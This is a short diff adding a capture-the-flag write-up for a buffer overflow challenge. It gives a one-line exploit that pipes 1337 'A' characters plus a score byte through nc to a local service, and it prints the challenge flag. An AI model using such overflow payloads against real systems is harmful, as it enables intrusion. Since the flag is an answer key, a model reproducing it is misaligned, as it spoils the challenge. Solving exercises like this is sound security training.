@@ -1,0 +1,9 @@
+Buffer Overflow problem
+
+Solution: load name up with enough chars to overwrite score.
+
+python -c "print 'A'*1337 + '\x0f'" | nc localhost 12348
+                 |------|    |--|
+                name buffer score of 15
+
+stuyctf{who_said_this_is_not_winnable}
